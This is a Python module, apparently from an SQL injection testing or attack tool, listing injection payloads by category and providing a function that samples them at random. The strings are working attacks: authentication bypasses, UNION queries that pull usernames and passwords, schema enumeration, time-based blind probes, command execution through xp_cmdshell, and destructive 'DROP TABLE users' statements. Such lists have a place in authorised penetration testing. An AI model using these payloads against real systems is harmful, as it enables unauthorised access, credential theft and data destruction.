### payloads.py

# Contains SQL injection payloads and functions for payload selection
import random

SQL_PAYLOADS = {
    "basic": [
        "'", "\"", "`",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "'; --", "\"; --",
        "'; #", "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR '1'='1' /*",
        "admin' --", "admin' #", "admin'/*",
        "')", "\"))",
        "') OR ('1'='1", "\")) OR (\"1\"=\"1"
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
    ],
    "error_based": [
        "' AND 1=CONVERT(INT, (SELECT @@version))--",
        "' AND 1=(SELECT COUNT(*) FROM tablenames)--",
        "' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--",
        "' OR 1=1 WAITFOR DELAY '0:0:5'--",
        "' OR 1=1 AND SLEEP(5)--"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SLEEP(5)--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "' OR BENCHMARK(1000000,MD5('test'))--"
    ],
    "advanced": [
        "'/**/OR/**/'1'='1",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXECUTE IMMEDIATE 'DROP TABLE users'--",
        "' OR 1=1/**/--",
        "' OR '1'='1'/**/--",
        "'; DROP TABLE users--",
        "%27%20OR%20%271%27%3D%271",  # URL-encoded: ' OR '1'='1
        "\" OR \"1\"=\"1\"--",
        "%22%20OR%20%221%22%3D%221"  # URL-encoded: " OR "1"="1
    ]
}

def get_random_payloads(sql_payloads, num_payloads=5):
    """
    Select a random subset of payloads from each category.

    Args:
        sql_payloads (dict): Dictionary containing payload categories.
        num_payloads (int): Number of payloads to select from each category.

    Returns:
        list: A list of selected payloads.
    """
    selected_payloads = []
    for category, payloads in sql_payloads.items():
        if len(payloads) <= num_payloads:
            selected_payloads.extend(payloads)
        else:
            selected_payloads.extend(random.sample(payloads, num_payloads))
    return selected_payloads
